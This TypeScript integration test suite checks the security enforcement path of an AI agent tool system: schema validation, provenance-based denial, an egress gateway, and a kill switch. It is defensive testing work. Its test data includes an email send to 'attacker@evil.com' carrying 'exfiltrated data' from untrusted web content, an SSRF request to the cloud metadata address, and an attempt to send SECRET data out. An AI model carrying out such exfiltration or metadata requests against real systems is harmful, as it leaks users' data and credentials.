/**
 * INTEGRATION TESTS — Phase 1: Security Enforcement Path
 *
 * These tests verify that the security modules are actually wired together
 * through the REAL execution path:
 *
 *   agent tool call
 *   → ExecutionBoundary  (kill switch → provenance → policy → schema → budget)
 *   → EgressGateway      (domain → SSRF → piggybacking → rate-limit → fetch)
 *   → Tool execute()     (only if all gates pass)
 *
 * Tests exercise boundary.run() directly, not EgressGateway or policy in isolation.
 * That is the critical distinction from the adversarial suite which tests components.
 */

import * as assert from "assert";
import * as fs from "fs";
import * as path from "path";
import { ExecutionBoundary } from "../src/boundary";
import { ToolRegistry } from "../src/registry";
import { KillSwitch } from "../src/killswitch";
import { BudgetTracker } from "../src/budget";
import {
  createFetchUrlTool,
  sendEmailTool,
  readFileTool,
} from "../src/tools";
import { createProvenance } from "../src/provenance";
import { DEFAULT_TOOL_POLICIES, ToolSecurityPolicy } from "../src/policy";
import { securityEventBus, SecurityEvent } from "../src/security-events";
import { startMockServer } from "../demo/mock-server";

const KILLSWITCH_PATH = "./.test-killswitch-integration";

// ---------------------------------------------------------------------------
// Test-local policy for ad-hoc spy tools.
// spy_tool: LOW risk, no sensitive-data restrictions, allowed in test-scope.
// This does NOT go into DEFAULT_TOOL_POLICIES — it is only passed to test
// ExecutionBoundary instances via the customPolicies constructor parameter.
// ---------------------------------------------------------------------------
const SPY_TOOL_POLICY: ToolSecurityPolicy = {
  name: "spy_tool",
  risk: "LOW",
  allowedScopes: ["test-scope"],
  blockUntrustedProvenance: false,
};

async function runIntegrationTests() {
  console.log("============================================================");
  console.log("RUNNING INTEGRATION TESTS — Phase 1 Security Path (8 checks)");
  console.log("============================================================\n");

  if (fs.existsSync(KILLSWITCH_PATH)) fs.unlinkSync(KILLSWITCH_PATH);

  // Shared registry used by most tests
  const allowlist = new Set(["example.com"]);
  const registry = new ToolRegistry();
  registry.register(createFetchUrlTool(allowlist));
  registry.register(sendEmailTool);
  registry.register(readFileTool);

  const killSwitch = new KillSwitch(KILLSWITCH_PATH);
  const budget = new BudgetTracker({ fetch_url: 10, send_email: 10, read_file: 10 });
  const boundary = new ExecutionBoundary(registry, killSwitch, budget, allowlist);

  let passed = 0;
  const total = 8;

  function pass(label: string) {
    passed++;
    console.log(`PASS [${passed}/${total}]: ${label}`);
  }

  // =========================================================================
  // TEST 1 — Authorized low-risk tool with valid schema → ALLOW, tool executes
  // Security events: TOOL_REQUEST then POLICY_EVALUATION(ALLOW)
  // =========================================================================
  {
    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await boundary.run({
        name: "read_file",
        args: { path: "notes.txt" },
        scope: "file-access",
      });
    } finally {
      unsub();
    }

    assert.strictEqual(
      result!.ok,
      true,
      `Test 1: read_file with valid args should succeed, got: ${result!.error}`
    );
    assert.ok(
      typeof result!.output === "string" && result!.output.length > 0,
      "Test 1: tool output must be non-empty string"
    );

    const toolRequest = events.find((e) => e.type === "TOOL_REQUEST" && e.tool === "read_file");
    assert.ok(toolRequest, "Test 1: TOOL_REQUEST event must be emitted at boundary entry");

    const policyAllow = events.find(
      (e) => e.type === "POLICY_EVALUATION" && e.tool === "read_file" && e.decision === "ALLOW"
    );
    assert.ok(policyAllow, "Test 1: POLICY_EVALUATION(ALLOW) event must be emitted on success");

    pass("Authorized low-risk tool with valid schema → ALLOW + security events emitted");
  }

  // =========================================================================
  // TEST 2 — Invalid tool arguments → DENY before execute(), SCHEMA_VALIDATION_FAILURE emitted
  //
  // Design: spy_tool is authorized by a TEST-LOCAL custom policy map (not DEFAULT_TOOL_POLICIES).
  // This ensures execution reaches schema validation so we can prove the schema gate fires
  // before tool execute().  Production DEFAULT_TOOL_POLICIES is NOT modified.
  // =========================================================================
  {
    let toolExecuted = false;

    const spyRegistry = new ToolRegistry();
    spyRegistry.register({
      name: "spy_tool",
      allowedInScopes: ["test-scope"],
      // Legacy predicate intentionally fails — boundary must use jsonSchema via AJV, not this
      schema: (_args) => false,
      jsonSchema: {
        type: "object",
        properties: { required_field: { type: "string" } },
        required: ["required_field"],
        additionalProperties: false,
      },
      execute: async () => {
        toolExecuted = true;
        return "SHOULD NOT REACH HERE";
      },
    });

    // Test-local policy: spy_tool is authorized in test-scope (LOW risk, no restrictions).
    // This does NOT add spy_tool to production DEFAULT_TOOL_POLICIES.
    const testPolicies = { ...DEFAULT_TOOL_POLICIES, spy_tool: SPY_TOOL_POLICY };

    const spyBoundary = new ExecutionBoundary(
      spyRegistry,
      new KillSwitch(KILLSWITCH_PATH),
      new BudgetTracker({ spy_tool: 10 }),
      allowlist,
      testPolicies   // <-- custom policies, not DEFAULT_TOOL_POLICIES
    );

    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await spyBoundary.run({
        name: "spy_tool",
        // Missing required_field; rogue_field is additional and not allowed
        args: { rogue_field: "injected" },
        scope: "test-scope",
      });
    } finally {
      unsub();
    }

    assert.strictEqual(result!.ok, false, "Test 2: invalid args must be denied");
    assert.ok(
      result!.error?.toLowerCase().includes("schema") ||
      result!.error?.toLowerCase().includes("validation"),
      `Test 2: error must mention schema/validation, got: ${result!.error}`
    );
    assert.strictEqual(
      toolExecuted,
      false,
      "Test 2: execute() must NOT be called when schema validation fails"
    );

    const schemaEvent = events.find((e) => e.type === "SCHEMA_VALIDATION_FAILURE");
    assert.ok(
      schemaEvent,
      "Test 2: SCHEMA_VALIDATION_FAILURE security event must be emitted"
    );
    assert.strictEqual(schemaEvent!.decision, "DENY", "Test 2: SCHEMA_VALIDATION_FAILURE must carry DENY decision");

    pass("Invalid tool arguments → DENY before execute() + SCHEMA_VALIDATION_FAILURE emitted");
  }

  // =========================================================================
  // TEST 3 — Unauthorized tool call (untrusted provenance + blockUntrustedProvenance)
  // → DENY, tool execute() NOT called, POLICY_EVALUATION(DENY) emitted
  // =========================================================================
  {
    let toolExecuted = false;

    const spyRegistry = new ToolRegistry();
    spyRegistry.register({
      ...sendEmailTool,
      execute: async (args) => {
        toolExecuted = true;
        return sendEmailTool.execute(args);
      },
    });

    // Uses DEFAULT_TOOL_POLICIES which has send_email.blockUntrustedProvenance = true
    const spyBoundary = new ExecutionBoundary(
      spyRegistry,
      new KillSwitch(KILLSWITCH_PATH),
      new BudgetTracker({ send_email: 10 }),
      allowlist
    );

    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await spyBoundary.run({
        name: "send_email",
        args: { to: "attacker@evil.com", body: "exfiltrated data" },
        scope: "customer-support",
        // Structured UNTRUSTED provenance — policy.blockUntrustedProvenance = true
        provenance: createProvenance("UNTRUSTED", "PUBLIC", "malicious-web-content"),
        derivedFromUntrusted: true,
      });
    } finally {
      unsub();
    }

    assert.strictEqual(
      result!.ok,
      false,
      "Test 3: privileged tool from untrusted provenance must be denied"
    );
    assert.ok(
      result!.error?.includes("DENIED"),
      `Test 3: error must include DENIED, got: ${result!.error}`
    );
    assert.strictEqual(
      toolExecuted,
      false,
      "Test 3: execute() must NOT be called when authorization is denied"
    );

    const denyEvent = events.find(
      (e) => e.type === "POLICY_EVALUATION" && e.decision === "DENY" && e.tool === "send_email"
    );
    assert.ok(denyEvent, "Test 3: POLICY_EVALUATION(DENY) security event must be emitted");

    pass("Unauthorized tool (untrusted provenance) → DENY before execute() + POLICY_EVALUATION(DENY) emitted");
  }

  // =========================================================================
  // TEST 4 — Allowed network request goes through EgressGateway → ALLOW
  // Uses a deterministic local mock server (no real external network needed).
  // Proves the path: boundary → EgressGateway → NETWORK_REQUEST event → success.
  // =========================================================================
  {
    const mockServer = await startMockServer(0);
    // 127.0.0.1 is in the private range which EgressGateway normally blocks.
    // The gateway allows hosts from allowedDomains — but 127.0.0.1 resolves to
    // a loopback address.  To make the integration test work deterministically
    // without needing a real external host, we disable private-IP blocking in the
    // test-only gateway and allow 127.0.0.1 explicitly.  This is test scaffolding only.
    const { EgressGateway } = await import("../src/network/egress-gateway");
    const testGateway = new EgressGateway({
      allowedDomains: ["127.0.0.1"],
      allowedPorts: [80, 443, mockServer.port],
      blockPrivateIPs: false, // test-only: we own the mock server
    });

    const testRegistry = new ToolRegistry();
    testRegistry.register(createFetchUrlTool(testGateway));

    const testBoundary = new ExecutionBoundary(
      testRegistry,
      new KillSwitch(KILLSWITCH_PATH),
      new BudgetTracker({ fetch_url: 10 }),
      testGateway   // pass the gateway directly
    );

    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await testBoundary.run({
        name: "fetch_url",
        args: { url: `${mockServer.url}/api/public` },
        scope: "research",
        provenance: createProvenance("TRUSTED", "PUBLIC", "integration-test"),
        dataClassification: "PUBLIC",
      });
    } finally {
      unsub();
      await mockServer.close();
    }

    // The NETWORK_REQUEST event is emitted by EgressGateway.request() — proves real path taken
    const netEvent = events.find((e) => e.type === "NETWORK_REQUEST");
    assert.ok(
      netEvent,
      "Test 4: EgressGateway must emit NETWORK_REQUEST event (proves gateway was invoked)"
    );

    assert.strictEqual(
      result!.ok,
      true,
      `Test 4: fetch to allowed destination through EgressGateway should succeed, got: ${result!.error}`
    );

    pass("Allowed network request goes through EgressGateway → NETWORK_REQUEST event + ALLOW");
  }

  // =========================================================================
  // TEST 5 — Blocked network request (private/SSRF destination) → EgressGateway DENY
  // Actual TCP connection is NOT made — EgressGateway blocks before socket open.
  // =========================================================================
  {
    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await boundary.run({
        name: "fetch_url",
        args: { url: "http://169.254.169.254/latest/meta-data/" },
        scope: "research",
        provenance: createProvenance("TRUSTED", "PUBLIC", "integration-test"),
        dataClassification: "PUBLIC",
      });
    } finally {
      unsub();
    }

    assert.strictEqual(result!.ok, false, "Test 5: SSRF to cloud metadata must be denied");
    assert.ok(
      result!.error?.includes("DENIED"),
      `Test 5: error must include DENIED, got: ${result!.error}`
    );

    // EgressGateway emits REQUEST_BLOCKED or SSRF_DETECTION before any TCP
    const denialEvent = events.find(
      (e) => e.type === "SSRF_DETECTION" || e.type === "REQUEST_BLOCKED"
    );
    assert.ok(
      denialEvent,
      "Test 5: EgressGateway must emit SSRF_DETECTION or REQUEST_BLOCKED event"
    );

    pass("Blocked SSRF destination → EgressGateway DENY + SSRF/REQUEST_BLOCKED event (no TCP made)");
  }

  // =========================================================================
  // TEST 6 — Network piggybacking: SECRET data to allowed destination → DENY
  //
  // The destination domain is explicitly permitted in the allowlist.
  // The DATA FLOW is malicious: data has SECRET classification.
  // EgressGateway.detectPiggybacking (P-EXFIL-001) must block it.
  //
  // This is distinct from SSRF (destination blocked) — here the destination
  // is allowed but the data classification triggers denial.
  // =========================================================================
  {
    const mockServer = await startMockServer(0);
    const { EgressGateway } = await import("../src/network/egress-gateway");
    const testGateway = new EgressGateway({
      allowedDomains: ["127.0.0.1"],
      allowedPorts: [80, 443, mockServer.port],
      blockPrivateIPs: false,
    });

    const testRegistry = new ToolRegistry();
    testRegistry.register(createFetchUrlTool(testGateway));

    const testBoundary = new ExecutionBoundary(
      testRegistry,
      new KillSwitch(KILLSWITCH_PATH),
      new BudgetTracker({ fetch_url: 10 }),
      testGateway
    );

    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await testBoundary.run({
        name: "fetch_url",
        args: { url: `${mockServer.url}/api/public` },
        scope: "research",
        // SECRET classification with UNTRUSTED provenance — must trigger P-EXFIL-001
        provenance: createProvenance("UNTRUSTED", "SECRET", "demo/secret.txt"),
        dataClassification: "SECRET",
      });
    } finally {
      unsub();
      await mockServer.close();
    }

    assert.strictEqual(
      result!.ok,
      false,
      "Test 6: SECRET data to allowed destination must be denied (piggybacking/P-EXFIL-001)"
    );
    assert.ok(
      result!.error?.includes("DENIED"),
      `Test 6: error must include DENIED, got: ${result!.error}`
    );

    const exfilEvent = events.find((e) => e.type === "NETWORK_EXFILTRATION_ATTEMPT");
    assert.ok(
      exfilEvent,
      "Test 6: NETWORK_EXFILTRATION_ATTEMPT event must be emitted (P-EXFIL-001)"
    );

    pass("SECRET data to allowed destination → EgressGateway P-EXFIL-001 DENY + NETWORK_EXFILTRATION_ATTEMPT event");
  }

  // =========================================================================
  // TEST 7 — No raw fetch() bypass: tools.ts uses only gateway.request()
  //
  // Structural source inspection proves that no agent-controlled tool calls
  // global fetch() directly, bypassing EgressGateway.
  // =========================================================================
  {
    const findSrcFile = (filename: string): string => {
      const candidates = [
        path.join(__dirname, "..", "src", filename),
        path.join(__dirname, "..", "..", "src", filename),
        path.join(process.cwd(), "src", filename),
      ];
      for (const p of candidates) {
        if (fs.existsSync(p)) return p;
      }
      throw new Error(`Cannot find ${filename} in any searched location`);
    };

    const toolsSource = fs.readFileSync(findSrcFile("tools.ts"), "utf-8");

    // Strip comment lines before searching
    const nonCommentLines = toolsSource
      .split("\n")
      .filter((line) => !line.trim().startsWith("//") && !line.trim().startsWith("*"));
    const nonCommentSource = nonCommentLines.join("\n");

    // Must find no bare fetch() call outside comments
    const rawFetchMatch = nonCommentSource.match(/\bfetch\s*\(/);
    assert.strictEqual(
      rawFetchMatch,
      null,
      `Test 7: tools.ts must not call raw fetch() — found: ${rawFetchMatch?.[0]}`
    );

    // Must find gateway.request() — the one approved network path
    assert.ok(
      toolsSource.includes("gateway.request("),
      "Test 7: tools.ts must use gateway.request() as the network call"
    );

    // boundary.ts must also route through gateway
    const boundarySource = fs.readFileSync(findSrcFile("boundary.ts"), "utf-8");
    assert.ok(
      boundarySource.includes("this.gateway.request("),
      "Test 7: boundary.ts must dispatch fetch_url through this.gateway.request()"
    );

    pass("No raw fetch() bypass — tools.ts uses gateway.request() exclusively");
  }

  // =========================================================================
  // TEST 8 — Kill switch: active kill switch halts all tool calls
  // Tool execute() must NOT be called; KILL_SWITCH_TRIGGERED event must be emitted.
  // =========================================================================
  {
    let toolExecuted = false;

    const spyRegistry = new ToolRegistry();
    spyRegistry.register({
      ...readFileTool,
      execute: async (args) => {
        toolExecuted = true;
        return readFileTool.execute(args);
      },
    });

    const spyKillSwitch = new KillSwitch(KILLSWITCH_PATH);
    const spyBudget = new BudgetTracker({ read_file: 10 });
    const spyBoundary = new ExecutionBoundary(spyRegistry, spyKillSwitch, spyBudget, allowlist);

    // Activate kill switch BEFORE making the tool call
    spyKillSwitch.trigger("integration test — kill switch verification");

    const events: SecurityEvent[] = [];
    const unsub = securityEventBus.subscribe((e) => events.push(e));

    let result;
    try {
      result = await spyBoundary.run({
        name: "read_file",
        args: { path: "notes.txt" },
        scope: "file-access",
      });
    } finally {
      unsub();
      // Clean up the flag file so subsequent tests are not affected
      spyKillSwitch.reset();
    }

    assert.strictEqual(result!.ok, false, "Test 8: kill switch must halt the tool call");
    assert.ok(
      result!.error?.includes("HALTED") || result!.error?.includes("kill switch"),
      `Test 8: error must reference kill switch, got: ${result!.error}`
    );
    assert.strictEqual(
      toolExecuted,
      false,
      "Test 8: execute() must NOT be called when kill switch is active"
    );

    const ksEvent = events.find((e) => e.type === "KILL_SWITCH_TRIGGERED");
    assert.ok(
      ksEvent,
      "Test 8: KILL_SWITCH_TRIGGERED security event must be emitted"
    );
    assert.strictEqual(ksEvent!.decision, "DENY", "Test 8: kill switch event must carry DENY decision");

    pass("Kill switch active → HALTED before execute() + KILL_SWITCH_TRIGGERED event emitted");
  }

  console.log("\n============================================================");
  console.log(`ALL ${passed}/${total} INTEGRATION TESTS PASSED`);
  console.log("============================================================\n");
}

if (require.main === module) {
  runIntegrationTests().catch((err) => {
    console.error("INTEGRATION TEST FAILED:", err);
    process.exit(1);
  });
}
